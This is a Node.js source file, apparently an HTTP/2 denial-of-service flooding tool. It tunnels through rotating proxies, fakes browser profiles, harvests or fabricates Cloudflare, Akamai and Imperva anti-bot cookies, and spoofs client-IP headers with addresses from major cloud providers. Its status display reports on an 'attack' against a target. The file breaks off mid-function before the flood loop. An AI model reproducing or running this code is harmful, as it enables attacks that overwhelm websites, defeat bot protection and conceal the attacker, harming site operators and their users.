// UPDATE NEW H2 LIKEY HUMAN + authproxy by shiro
// I hope you are happy 

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const HPACK = require('hpack');
var colors = require("colors");
const v8 = require("v8");
const os = require("os");
const { exec } = require('child_process');

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\n" + 
                    (options.authHeader || "") + 
                    "Connection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200") || response.includes("HTTP/1.0 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    if (index === -1) return undefined;
    if (index + 1 < process.argv.length && !process.argv[index + 1].startsWith('--')) {
        return process.argv[index + 1];
    }
    return 'true';
}

function has_flag(flag) {
    return process.argv.includes(flag);
}

const options = {
    bfm: get_option('--bfm') === 'true',
    cookie: get_option('--cookie') === 'true',
    manualCookie: get_option('--getcookie'),
    cache: get_option('--cache') === 'true',
    autoCookie: get_option('--auto-cookie') === 'true',
    debug: get_option('--debug') === 'true',
    fakebot: get_option('--fakebot') === 'true',
    ratelimit: parseInt(get_option('--ratelimit')) || 0,
    autoratelimit: get_option('--autoratelimit') === 'true',
    referrer: get_option('--Referrer') === 'true',
    userAgent: get_option('--ua'),
    customProxy: get_option('--proxy'),
    auth: has_flag('--auth')
};

const AUTO_RATE_LIMIT_DEFAULT = 100;
const AUTO_RATE_LIMIT_MIN = 10;
const AUTO_RATE_LIMIT_DECREASE = 0.8;
const AUTO_RATE_LIMIT_INCREASE = 1.1;

const MAX_RAM_PERCENTAGE = 95; 
const proxyStats = {};

let targetCookies = '';

let cacheErrorCount = 0;
const MAX_CACHE_ERRORS = 100;
function trackCacheError(error) {
    cacheErrorCount++;
    console.log(`\x1b[31m[ERROR]\x1b[0m Cache error ${cacheErrorCount}/${MAX_CACHE_ERRORS}: ${error.message}`);

    if (cacheErrorCount >= MAX_CACHE_ERRORS && options.cache) {
        console.log(`\x1b[33m[WARNING]\x1b[0m Too many cache errors, disabling cache option`);
        options.cache = false;
    }
}

function parseProxy(proxyString) {
    let auth = null;
    let host = null;
    let port = null;

    if (options.auth) {
        // Format: ip:port:user:pass
        const parts = proxyString.split(':');
        host = parts[0];
        port = parseInt(parts[1]);
        if (parts.length >= 4) {
            auth = parts[2] + ':' + parts.slice(3).join(':');
        }
    } else if (proxyString.includes('@')) {
        const parts = proxyString.split('@');
        auth = parts[0];
        const hostPort = parts[1].split(':');
        host = hostPort[0];
        port = parseInt(hostPort[1]);
    } else {
        const parts = proxyString.split(':');
        host = parts[0];
        port = parseInt(parts[1]);
    }

    return {
        auth: auth,
        host: host,
        port: port,
        authHeader: auth ? 'Proxy-Authorization: Basic ' + Buffer.from(auth).toString('base64') + '\r\n' : ''
    };
}

function simulateJavaScriptCookies(hostname, responseBody) {
    let simulatedCookies = [];

    const isCloudflare = responseBody.includes('cloudflare') || 
                        responseBody.includes('cf-browser-verification') ||
                        responseBody.includes('cf_clearance') ||
                        responseBody.includes('cf-please-wait');
                        
    const isAkamai = responseBody.includes('akamai') ||
                    responseBody.includes('ak-challenge') ||
                    responseBody.includes('_abck=');
                    
    const isImperva = responseBody.includes('incapsula') || 
                      responseBody.includes('visid_incap_') ||
                      responseBody.includes('nlbi_');
    
    const isRecaptcha = responseBody.includes('recaptcha') || responseBody.includes('g-recaptcha');

    const domainParts = hostname.split('.');
    let domain = hostname;
    if (domainParts.length > 2) {
        domain = '.' + domainParts.slice(-2).join('.');
    }
    
    const now = Date.now();
    const expiry = now + 86400000;
    if (isCloudflare) {
        console.log(`\x1b[36m[INFO]\x1b[0m Cloudflare protection detected, simulating cf_clearance cookie`);
        const cfClearance = `cf_clearance=${randstr(32)}-${Math.floor(now/1000)}-0-1-${randstr(8)}`;
        simulatedCookies.push(cfClearance);
        
        simulatedCookies.push(`cf_chl_2=${randstr(10)}`);
        simulatedCookies.push(`cf_chl_prog=x${Math.floor(Math.random() * 19) + 1}`);
    }

    if (isAkamai) {
        console.log(`\x1b[36m[INFO]\x1b[0m Akamai protection detected, simulating bot detection cookies`);
        simulatedCookies.push(`_abck=${randstr(86)}~0~${randstr(40)}~${randstr(26)}`);
        simulatedCookies.push(`bm_sz=${randstr(64)}~${expiry}`);
    }
    
    if (isImperva) {
        console.log(`\x1b[36m[INFO]\x1b[0m Imperva/Incapsula protection detected, simulating cookies`);
        simulatedCookies.push(`visid_incap_${Math.floor(100000 + Math.random() * 999999)}=${randstr(48)}`);
        simulatedCookies.push(`incap_ses_${Math.floor(100 + Math.random() * 999)}_${Math.floor(100000 + Math.random() * 999999)}=${randstr(48)}`);
        simulatedCookies.push(`nlbi_${Math.floor(100000 + Math.random() * 999999)}=${randstr(32)}`);
    }
    
    simulatedCookies.push(`session=${randstr(32)}`);
    simulatedCookies.push(`sessid=${randstr(16)}`);
    
    const cookiePatterns = [
        { regex: /document\.cookie\s*=\s*["']([^=]+)=/g, group: 1 },
        { regex: /setCookie\(\s*["']([^"']+)["']/g, group: 1 },
        { regex: /cookie\s*:\s*["']([^"']+)["']/g, group: 1 }
    ];
    
    for (const pattern of cookiePatterns) {
        let match;
        while ((match = pattern.regex.exec(responseBody)) !== null) {
            if (match[pattern.group]) {
                const cookieName = match[pattern.group].trim();
                if (cookieName && cookieName.length > 1 && cookieName.length < 50) {
                    console.log(`\x1b[36m[INFO]\x1b[0m Detected cookie pattern: ${cookieName}`);
                    simulatedCookies.push(`${cookieName}=${randstr(32)}`);
                }
            }
        }
    }
    
    return simulatedCookies;
}

function getCookieFromFile(targetUrl) {
    try {
        const parsedUrl = url.parse(targetUrl);
        const hostname = parsedUrl.hostname;
        
        const filename = hostname.replace(/[^a-zA-Z0-9.-]/g, '_') + '.cookie';
        
        if (!fs.existsSync(filename)) {
            console.log(`\x1b[33m[WARNING]\x1b[0m Cookie file ${filename} not found.`);
            return '';
        }
        
        const cookieContent = fs.readFileSync(filename, 'utf8');
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Loaded cookies from file: ${filename}`);
        return cookieContent.trim();
    } catch (error) {
        console.log(`\x1b[31m[ERROR]\x1b[0m Failed to read cookie file: ${error.message}`);
        return '';
    }
}

function fetchCookiesFromTarget(targetUrl) {
    return new Promise(async (resolve, reject) => {
        if (options.manualCookie) {
            console.log(`\x1b[32m[SUCCESS]\x1b[0m Using manually provided cookies: ${options.manualCookie.substring(0, 50)}${options.manualCookie.length > 50 ? '...' : ''}`);
            return resolve(options.manualCookie);
        }
        
        const parsedUrl = url.parse(targetUrl);
        const httpModule = parsedUrl.protocol === 'https:' ? require('https') : require('http');
        const zlib = require('zlib');
        const browserProfiles = [
            {
                name: 'Opera',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Connection': 'keep-alive',
                    'Sec-Ch-Ua': '"Chromium";v="131", "Not_A Brand";v="24"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0',
                    'Priority': 'u=0, i'
                }
            },
            {
                name: 'Chrome',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'id,en-US;q=0.9,en;q=0.8,ms;q=0.7,th;q=0.6,zh-CN;q=0.5,zh;q=0.4',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Connection': 'keep-alive',
                    'Sec-Ch-Ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Linux"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0'
                }
            },
            {
                name: 'Brave',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Ch-Ua': '"Chromium";v="131", "Not_A Brand";v="24"',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Mode': 'navigate', 
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'TE': 'trailers'
                }
            },
            {
                name: 'Firefox',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate', 
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'TE': 'trailers'
                }
            },
            {
                name: 'Mobile Chrome',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Sec-Ch-Ua': '"Chromium";v="131", "Not_A Brand";v="24"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Linux"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1'
                }
            }
        ];

        const pathsToTry = [
            '/',
            '/index.html',
            '/home',
            '/en'
        ];

        let allCookies = [];
        let cookiesFound = false;
        let jsDetected = false;
        let pageContent = '';
        
        const makeRequest = async (options, browser, path = null) => {
            return new Promise((resolveRequest) => {
                console.log(`\x1b[36m[INFO]\x1b[0m Trying to fetch cookies with ${browser} browser profile${path ? ' on path ' + path : ''}...`);
                
                const req = httpModule.request(options, (res) => {

                    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                        console.log(`\x1b[36m[INFO]\x1b[0m Following redirect to ${res.headers.location}`);
               
                        if (res.headers['set-cookie']) {
                            const newCookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]);
                            allCookies.push(...newCookies);
                            cookiesFound = true;
                        }
                        
                        let redirectUrl = res.headers.location;
                        if (!redirectUrl.startsWith('http')) {
                            redirectUrl = url.resolve(targetUrl, redirectUrl);
                        }
                        
                        const redirectParsedUrl = url.parse(redirectUrl);
                        const redirectOptions = {
                            hostname: redirectParsedUrl.hostname,
                            port: redirectParsedUrl.port || (redirectParsedUrl.protocol === 'https:' ? 443 : 80),
                            path: redirectParsedUrl.path || '/',
                            method: 'GET',
                            headers: options.headers,
                            rejectUnauthorized: false,
                            timeout: 8000
                        };
                        
                        makeRequest(redirectOptions, browser)
                            .then(redirectCookies => {
                                resolveRequest(redirectCookies);
                            });
                        return;
                    }
                    
                    let responseBody = '';
                    let chunks = [];
                    
                    let stream = res;
                    if (res.headers['content-encoding'] === 'gzip') {
                        stream = res.pipe(zlib.createGunzip());
                    } else if (res.headers['content-encoding'] === 'deflate') {
                        stream = res.pipe(zlib.createInflate());
                    } else if (res.headers['content-encoding'] === 'br') {
                        stream = res.pipe(zlib.createBrotliDecompress());
                    }
                    
                    stream.on('data', (chunk) => {
                        chunks.push(chunk);
                    });
                    
                    stream.on('end', () => {
                        responseBody = Buffer.concat(chunks).toString();
                        pageContent = responseBody;
                        
                        if (res.headers['set-cookie']) {
                            const newCookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]);
                            allCookies.push(...newCookies);
                            cookiesFound = true;
                            console.log(`\x1b[32m[SUCCESS]\x1b[0m Found ${newCookies.length} cookies with ${browser}${path ? ' on path ' + path : ''}`);
                        }
                        if (!jsDetected && (responseBody.includes('document.cookie') || 
                            responseBody.includes('setCookie') || 
                            responseBody.includes('meta http-equiv="refresh"'))) {
                            jsDetected = true;
                            console.log(`\x1b[33m[INFO]\x1b[0m JavaScript cookie setting detected - will simulate common patterns`);
                        }
                        
                        resolveRequest(allCookies);
                    });
                });
                
                req.on('error', (error) => {
                    console.log(`\x1b[31m[ERROR]\x1b[0m Failed with ${browser}: ${error.message}`);
                    resolveRequest(allCookies);
                });
                
                req.setTimeout(8000, () => {
                    req.destroy();
                    console.log(`\x1b[31m[ERROR]\x1b[0m Request with ${browser} timed out`);
                    resolveRequest(allCookies);
                });
                
                req.end();
            });
        };
        
        for (const profile of browserProfiles) {
            if (cookiesFound) break;
            const options = {
                hostname: parsedUrl.hostname,
                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                path: parsedUrl.path || '/',
                method: 'GET',
                headers: profile.headers,
                rejectUnauthorized: false,
                timeout: 8000
            };
         
            await makeRequest(options, profile.name);
            
            if (!cookiesFound) {
                for (const path of pathsToTry) {
                    options.path = path;
                    await makeRequest(options, profile.name, path);
                    if (cookiesFound) break;
                }
            }
        }
        
        if (jsDetected || !cookiesFound) {
            console.log(`\x1b[36m[INFO]\x1b[0m Simulating JavaScript-based cookies for ${parsedUrl.hostname}`);
            const simulatedCookies = simulateJavaScriptCookies(parsedUrl.hostname, pageContent);
            allCookies.push(...simulatedCookies);
        }
        
        const uniqueCookies = [...new Set(allCookies)];
        const cookieString = uniqueCookies.join('; ');
        
        if (cookieString) {
            console.log(`\x1b[32m[SUCCESS]\x1b[0m Collected ${uniqueCookies.length} unique cookies from target`);
        } else {
            console.log(`\x1b[33m[WARNING]\x1b[0m No cookies found from target after all attempts`);
            console.log(`\x1b[36m[INFO]\x1b[0m Try using the --manual-cookie option to specify cookies directly`);
        }
        
        resolve(cookieString);
    });
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.log(`\x1b[31m[ERROR]\x1b[0m Failed to change TCP parameters. Root access may be required.`);
        } else {
            console.log(`\x1b[32m[SUCCESS]\x1b[0m TCP parameters changed successfully:`);
            console.log(`\x1b[36m[TCP]\x1b[0m Congestion Control: ${congestionControl}`);
            console.log(`\x1b[36m[TCP]\x1b[0m SACK: ${sack}`);
            console.log(`\x1b[36m[TCP]\x1b[0m Window Scaling: ${windowScaling}`);
            console.log(`\x1b[36m[TCP]\x1b[0m Timestamps: ${timestamps}`);
            console.log(`\x1b[36m[TCP]\x1b[0m Selective ACK: ${selectiveAck}`);
            console.log(`\x1b[36m[TCP]\x1b[0m Fast Open: ${tcpFastOpen}`);
        }
    });
}

const stats = {
  errors: 0,
  statusCodes: {},
  statusCodesLastUpdate: {},
  statusCodesPerSecond: {},
  startTime: Date.now(),
  lastUpdate: Date.now(),
  proxiesRemoved: 0,
  rateLimitedProxies: 0,
  retryWaitingProxies: 0,
  avgAutoRateLimit: 0,
  totalRetryAfters: 0,
  totalRequests: 0,
  lastRequestTime: Date.now()
};

function printStats() {
  const runtime = Math.round((Date.now() - stats.startTime) / 1000);
  const now = Date.now();
  const timeSinceLastUpdate = now - stats.lastUpdate;
  
  Object.keys(stats.statusCodes).forEach(code => {
    const current = stats.statusCodes[code];
    const previous = stats.statusCodesLastUpdate[code] || 0;
    stats.statusCodesPerSecond[code] = Math.round((current - previous) / (timeSinceLastUpdate / 1000));
    stats.statusCodesLastUpdate[code] = current;
  });
  
  stats.rateLimitedProxies = 0;
  stats.retryWaitingProxies = 0;
  
  let totalAutoRateLimit = 0;
  let autoRateLimitCount = 0;
  
  Object.keys(proxyStats).forEach(proxyIP => {
    if (isProxyRateLimited(proxyIP)) stats.rateLimitedProxies++;
    if (isProxyInRetryWait(proxyIP)) stats.retryWaitingProxies++;
    
    if (options.autoratelimit) {
      totalAutoRateLimit += proxyStats[proxyIP].autoRateLimit;
      autoRateLimitCount++;
    }
  });
  
  if (autoRateLimitCount > 0) {
    stats.avgAutoRateLimit = Math.round(totalAutoRateLimit / autoRateLimitCount);
  }
  
  stats.lastUpdate = now;
  
  const timeSinceLastRequest = now - stats.lastRequestTime;
  if (timeSinceLastRequest > 5000) {
    console.log(`\x1b[31m[WARNING]\x1b[0m No requests in the last ${Math.round(timeSinceLastRequest/1000)} seconds!`);
  }
  
  console.clear();
  console.log('target: '+process.argv[2]);
  console.log('time: '+process.argv[3] + ' / attack on: ' + runtime + 's');
  console.log('rates: '+process.argv[4]);
  console.log('thread: '+process.argv[5]);
  console.log(`proxyfile: ${args.proxyFile} | total: ${proxies.length}`);
  console.log(`total rqs: ${stats.totalRequests} | per s: ${Math.round(stats.totalRequests/runtime)}`);
  console.log(`error: ${stats.errors}`);
  
  if (options.ratelimit) {
    console.log(`Rate Limited Proxies: ${stats.rateLimitedProxies}`);
  } else if (options.autoratelimit) {
    console.log(`Auto Rate Limited Proxies: ${stats.rateLimitedProxies} (Avg Limit: ${stats.avgAutoRateLimit})`);
  }
  
  console.log(`Retry-After: ${stats.retryWaitingProxies} proxies waiting (Total received: ${stats.totalRetryAfters})`);

  if (Object.keys(stats.statusCodes).length > 0) {
    console.log(`Status Codes (total/per sec):`);
    Object.keys(stats.statusCodes).sort().forEach(code => {
      let color = "\x1b[37m";
      if (code.startsWith("2")) color = "\x1b[32m";
      if (code.startsWith("3")) color = "\x1b[33m";
      if (code.startsWith("4")) color = "\x1b[31m";
      if (code.startsWith("5")) color = "\x1b[35m";
      
      const total = stats.statusCodes[code];
      const perSecond = stats.statusCodesPerSecond[code] || 0;
      console.log(`  ${color}${code}\x1b[0m: ${total} (${perSecond}/s)`);
    });
  } else {
    console.log(`No responses received yet`);
  }
}

function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }

const accept_header = [
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

const browsers = ["chrome", "firefox"]; 

let lastBrowserWasFirefox = false;

const getRandomBrowser = () => {
    lastBrowserWasFirefox = !lastBrowserWasFirefox;
    return lastBrowserWasFirefox ? "firefox" : "chrome";
};

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
}

function randstra(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS15169", country: "US", ip: "8.8.4." },
        { asn: "AS15169", country: "US", ip: "74.125.0." },
        { asn: "AS15169", country: "US", ip: "216.58.0." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS8075", country: "US", ip: "13.107.22." },
        { asn: "AS8075", country: "US", ip: "20.112.0." },
        { asn: "AS8075", country: "US", ip: "40.112.0." },      
        { asn: "AS13335", country: "NL", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS13335", country: "NL", ip: "172.64.0." },
        { asn: "AS13335", country: "NL", ip: "188.114.0." },
        { asn: "AS16509", country: "DE", ip: "3.120.0." },
        { asn: "AS16509", country: "DE", ip: "13.32.0." },
        { asn: "AS16509", country: "DE", ip: "52.192.0." },
        { asn: "AS16509", country: "DE", ip: "54.192.0." },
        { asn: "AS32934", country: "US", ip: "31.13.0." },
        { asn: "AS32934", country: "US", ip: "69.171.0." },
        { asn: "AS32934", country: "US", ip: "157.240.0." },
        { asn: "AS714", country: "US", ip: "17.0.0." },
        { asn: "AS714", country: "US", ip: "17.128.0." },
        { asn: "AS55095", country: "US", ip: "23.246.0." },
        { asn: "AS55095", country: "US", ip: "52.88.0." },
        { asn: "AS20940", country: "US", ip: "23.0.0." },
        { asn: "AS20940", country: "US", ip: "23.1.0." },
        { asn: "AS54113", country: "US", ip: "146.75.0." },
        { asn: "AS54113", country: "US", ip: "151.101.0." },
        { asn: "AS16276", country: "FR", ip: "51.68.0." },
        { asn: "AS16276", country: "FR", ip: "141.95.0." },
        { asn: "AS24940", country: "DE", ip: "49.12.0." },
        { asn: "AS24940", country: "DE", ip: "78.46.0." }
    ];

    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

function generateAlternativeIPHeaders() {
    const headers = {};
    
    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstra(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();
    
    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstra(5)}`;
    }
    
    return headers;
}

let debugHeadersStorage = {
    '200': null,
    '403': null
};

const debugFilenames = {
    '200': '200.txt',
    '403': '403.txt'
}

function saveDebugHeaders(statusCode, headers, targetUrl) {
    if (!options.debug) return;
    
    if (statusCode !== '200' && statusCode !== '403') return;
    
    if (debugHeadersStorage[statusCode] !== null) return;
    
    try {
        const timestamp = new Date().toISOString();
        const formattedHeaders = {};
        
        Object.keys(headers).forEach(key => {
            if (!key.startsWith(':')) {
                formattedHeaders[key] = headers[key];
            }
        });
        
        let content = `===== DEBUG HEADERS FOR STATUS ${statusCode} =====\n`;
        content += `URL: ${targetUrl}\n`;
        content += `Timestamp: ${timestamp}\n`;
        content += `\n--- Headers ---\n`;
        
        Object.keys(formattedHeaders).sort().forEach(key => {
            content += `${key}: ${formattedHeaders[key]}\n`;
        });
        
        content += `\n--- Alternative IP Headers Used ---\n`;
        const ipHeaderNames = ["cdn-loop", "true-client-ip", "via", "request-context", "x-edge-ip", "x-coming-from", "akamai-client-ip"];
        ipHeaderNames.forEach(name => {
            if (formattedHeaders[name]) {
                content += `${name}: ${formattedHeaders[name]}\n`;
            }
        });
        
        fs.writeFileSync(debugFilenames[statusCode], content);
        console.log(`\x1b[32m[DEBUG]\x1b[0m Saved headers that resulted in status ${statusCode} to ${debugFilenames[statusCode]}`);
        
        debugHeadersStorage[statusCode] = true;
    } catch (error) {
        console.log(`\x1b[31m[ERROR]\x1b[0m Failed to save debug headers: ${error.message}`);
    }
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
  if (!elements || elements.length === 0) return undefined;
    return elements[randomIntn(0, elements.length - 1)];
}

const HTTP2_FRAME_TYPES = {
    DATA: 0x00,
    HEADERS: 0x01,
    PRIORITY: 0x02,
    RST_STREAM: 0x03,
    SETTINGS: 0x04,
    PUSH_PROMISE: 0x05,
    PING: 0x06,
    GOAWAY: 0x07,
    WINDOW_UPDATE: 0x08,
    CONTINUATION: 0x09,
    ALTSVC: 0x0a,
    ORIGIN: 0x0c,
    PRIORITY_UPDATE: 0x10
};

const HTTP2_FLAGS = {
    END_STREAM: 0x1,
    END_HEADERS: 0x4,
    PRIORITY: 0x20
};

const HTTP2_SETTINGS = {
    HEADER_TABLE_SIZE: 0x01,
    ENABLE_PUSH: 0x02,
    MAX_CONCURRENT_STREAMS: 0x03,
    INITIAL_WINDOW_SIZE: 0x04,
    MAX_FRAME_SIZE: 0x05,
    MAX_HEADER_LIST_SIZE: 0x06,
    ENABLE_CONNECT_PROTOCOL: 0x08,
    NO_RFC7540_PRIORITIES: 0x09,
    TLS_RENEG_PERMITTED: 0x10,
    ENABLE_METADATA: 0x4d44
};

const HTTP2_ERROR_CODES = {
    NO_ERROR: 0x00,
    PROTOCOL_ERROR: 0x01,
    INTERNAL_ERROR: 0x02,
    FLOW_CONTROL_ERROR: 0x03,
    SETTINGS_TIMEOUT: 0x04,
    STREAM_CLOSED: 0x05,
    FRAME_SIZE_ERROR: 0x06,
    REFUSED_STREAM: 0x07,
    CANCEL: 0x08,
    COMPRESSION_ERROR: 0x09,
    CONNECT_ERROR: 0x0a,
    ENHANCE_YOUR_CALM: 0x0b,
    INADEQUATE_SECURITY: 0x0c,
    HTTP_1_1_REQUIRED: 0x0d
};

const HTTP2_SETTINGS_DEFAULTS = {
    [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 4096,
    [HTTP2_SETTINGS.ENABLE_PUSH]: 1,
    [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: Number.MAX_SAFE_INTEGER,
    [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 65535,
    [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384,
    [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: Number.MAX_SAFE_INTEGER,
    [HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]: 0,
    [HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]: 0,
    [HTTP2_SETTINGS.TLS_RENEG_PERMITTED]: 0,
    [HTTP2_SETTINGS.ENABLE_METADATA]: 0
};

const transformSettings = (settings) => {
